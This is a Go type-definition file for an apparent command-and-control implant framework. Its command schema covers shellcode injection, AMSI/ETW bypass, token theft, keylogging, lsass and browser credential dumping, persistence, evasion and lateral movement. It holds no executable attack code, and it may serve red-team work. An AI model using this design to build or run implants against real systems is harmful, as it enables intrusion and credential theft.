package types

import "time"

// Command represents a command to be executed by an agent
type Command struct {
	ID              string            `json:"id"`
	AgentID         string            `json:"agent_id"`
	Command         string            `json:"command"`
	Args            []string          `json:"args,omitempty"`
	WorkingDir      string            `json:"working_dir,omitempty"`
	Timeout         int               `json:"timeout,omitempty"`
	CreatedAt       time.Time         `json:"created_at"`
	ExecutedAt      time.Time         `json:"executed_at,omitempty"`
	CompletedAt     time.Time         `json:"completed_at,omitempty"`
	Status          string            `json:"status"`
	ExitCode        int               `json:"exit_code,omitempty"`
	Output          string            `json:"output,omitempty"`
	Error           string            `json:"error,omitempty"`
	Metadata        map[string]string `json:"metadata,omitempty"`

	// Operation Type Fields
	OperationType   string `json:"operation_type,omitempty"`
	SourcePath      string `json:"source_path,omitempty"`
	DestinationPath string `json:"destination_path,omitempty"`
	FileContent     []byte `json:"file_content,omitempty"`
	IsEncrypted     bool   `json:"is_encrypted,omitempty"`

	// Process Management Fields
	ProcessName string   `json:"process_name,omitempty"`
	ProcessID   int      `json:"process_id,omitempty"`
	ProcessPath string   `json:"process_path,omitempty"`
	ProcessArgs []string `json:"process_args,omitempty"`

	// Persistence Fields
	PersistMethod string `json:"persist_method,omitempty"`
	PersistName   string `json:"persist_name,omitempty"`

	// LOLBin Fetch Fields (operation_type: lolbin_fetch)
	FetchURL    string `json:"fetch_url,omitempty"`    // URL to download from
	FetchMethod string `json:"fetch_method,omitempty"` // certutil | bitsadmin | curl | powershell

	// Level 2 — Process Injection (operation_type: inject_remote | inject_self)
	ShellcodeB64 string `json:"shellcode_b64,omitempty"` // base64-encoded shellcode
	InjectMethod string `json:"inject_method,omitempty"` // crt | apc (remote injection method)
	InjectPID    uint32 `json:"inject_pid,omitempty"`    // target PID for remote injection

	// Level 2 — PPID Spoofing (operation_type: process_start with ppid fields set)
	SpoofParentPID  uint32 `json:"spoof_parent_pid,omitempty"`  // explicit parent PID
	SpoofParentName string `json:"spoof_parent_name,omitempty"` // parent process name (e.g. "explorer.exe")

	// Level 2 — Timestomping (operation_type: timestomp)
	TimestompRef  string `json:"timestomp_ref,omitempty"`  // reference file to copy timestamps from
	TimestompTime string `json:"timestomp_time,omitempty"` // explicit RFC3339 time to set

	// Phase 3 — AMSI/ETW bypass (operation_type: amsi_bypass | etw_bypass)
	BypassTargetPID uint32 `json:"bypass_target_pid,omitempty"` // 0 = in-process, >0 = remote PID

	// Phase 3 — Token manipulation
	// operation_type: token_list | token_steal | token_impersonate | token_make | token_revert | token_runas
	TokenPID    uint32 `json:"token_pid,omitempty"`    // PID to steal token from
	TokenUser   string `json:"token_user,omitempty"`   // username for make_token
	TokenDomain string `json:"token_domain,omitempty"` // domain for make_token
	TokenPass   string `json:"token_pass,omitempty"`   // password for make_token
	TokenExe    string `json:"token_exe,omitempty"`    // exe to spawn with token (token_runas)
	TokenArgs   string `json:"token_args,omitempty"`   // args for token_runas

	// Phase 3 — Screenshot (operation_type: screenshot)
	// No extra fields needed — result is base64 PNG in CommandResult.Output

	// Phase 3 — Keylogger (operation_type: keylog_start | keylog_dump | keylog_stop | keylog_clear)
	KeylogDuration int `json:"keylog_duration,omitempty"` // seconds to run (0 = run until stop)

	// Phase 4 — Advanced injection
	// hollow: operation_type=hollow, ProcessPath=target exe
	// hijack: operation_type=hijack, InjectPID=target PID
	// stomp: operation_type=stomp, SacrificialDLL + ShellcodeB64
	// mapinject: operation_type=mapinject, InjectPID=0 for local or >0 remote
	SacrificialDLL string `json:"sacrificial_dll,omitempty"` // DLL to stomp (stomp only)

	// Phase 5 — Credential access
	// lsass_dump: operation_type=lsass_dump, DestinationPath=output path
	// sam_dump:   operation_type=sam_dump, DestinationPath=output dir
	// browsercreds: operation_type=browsercreds (no extra fields; returns JSON)
	// clipboard:  operation_type=clipboard_read
	BrowserType string `json:"browser_type,omitempty"` // chrome|edge|brave|firefox|all

	// Phase 6 — Sleep obfuscation (operation_type: sleep_obf)
	SleepDuration int `json:"sleep_duration,omitempty"` // seconds

	// Phase 7 — NTDLL unhooking (operation_type: unhook_ntdll)

	// Phase 8 — Hardware breakpoints (operation_type: hwbp_set | hwbp_clear)
	HWBPAddr     string `json:"hwbp_addr,omitempty"`     // hex address string e.g. "0x7FFE0000"
	HWBPRegister uint8  `json:"hwbp_register,omitempty"` // 0-3 (DR0-DR3)

	// Phase 9 — BOF execution (operation_type: bof_exec)
	BOFData    string `json:"bof_data,omitempty"`    // base64-encoded COFF object
	BOFArgs    string `json:"bof_args,omitempty"`    // base64-encoded packed args

	// Phase 10 — Anti-debug / anti-VM / time gate (operation_type: antidebug | antivm | timegate_set)
	WorkingHoursStart int    `json:"working_hours_start,omitempty"` // 0-23
	WorkingHoursEnd   int    `json:"working_hours_end,omitempty"`   // 0-23
	KillDate          string `json:"kill_date,omitempty"`           // YYYY-MM-DD or RFC3339

	// Phase 11 — Network recon (operation_type: net_scan | arp_scan)
	ScanTargets     []string `json:"scan_targets,omitempty"`      // CIDR or IPs
	ScanPorts       []int    `json:"scan_ports,omitempty"`        // port list; empty = common
	ScanTimeout     int      `json:"scan_timeout,omitempty"`      // ms per probe (default 500)
	ScanWorkers     int      `json:"scan_workers,omitempty"`      // concurrency (default 200)
	ScanGrabBanners bool     `json:"scan_grab_banners,omitempty"` // grab service banners

	// Phase 11 — Registry (operation_type: reg_read | reg_write | reg_delete | reg_list)
	RegHive  string `json:"reg_hive,omitempty"`  // HKLM | HKCU | HKCR | HKU | HKCC
	RegKey   string `json:"reg_key,omitempty"`   // e.g. SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	RegValue string `json:"reg_value,omitempty"` // value name ("" = enumerate/delete key)
	RegData  string `json:"reg_data,omitempty"`  // data to write
	RegType  string `json:"reg_type,omitempty"`  // sz | dword | qword | expand_sz | multi_sz

	// Phase 11 — SOCKS5 proxy pivot (operation_type: socks5_start | socks5_stop | socks5_status)
	Socks5Addr string `json:"socks5_addr,omitempty"` // bind address e.g. "127.0.0.1:1080"

	// Port forwarding / reverse tunnel (operation_type: portfwd_start | portfwd_stop)
	FwdSessID string `json:"fwd_sess_id,omitempty"` // session ID assigned by server
	FwdTarget string `json:"fwd_target,omitempty"`  // rhost:rport agent should dial

	// Lateral movement (operation_type: lateral_wmi | lateral_winrm | lateral_schtask | lateral_service | lateral_dcom)
	LateralTarget     string `json:"lateral_target,omitempty"`      // remote hostname or IP
	LateralUser       string `json:"lateral_user,omitempty"`        // username (empty = current token)
	LateralDomain     string `json:"lateral_domain,omitempty"`      // domain (empty = local)
	LateralPass       string `json:"lateral_pass,omitempty"`        // password
	LateralCommand    string `json:"lateral_command,omitempty"`     // command to run on remote host
	LateralDCOMMethod string `json:"lateral_dcom_method,omitempty"` // mmc20 | shellwindows | shellbrowser
}

// CommandResult represents the result of a command execution
type CommandResult struct {
	CommandID string `json:"command_id"`
	ExitCode  int    `json:"exit_code"`
	Output    string `json:"output"`
	Error     string `json:"error"`
	Encrypted bool   `json:"encrypted"`
}

// AgentInfo contains basic agent information
type AgentInfo struct {
	ID           string `json:"id"`
	Hostname     string `json:"hostname"`
	Username     string `json:"username"`
	OS           string `json:"os"`
	Architecture string `json:"architecture"`
	ProcessID    int    `json:"process_id"`
	Privileges   string `json:"privileges"`
	WorkingDir   string `json:"working_dir"`
}

// APIResponse represents standard API response
type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
	Error   string      `json:"error,omitempty"`
	Pad     string      `json:"_pad,omitempty"` // random traffic padding — ignored by receivers
}
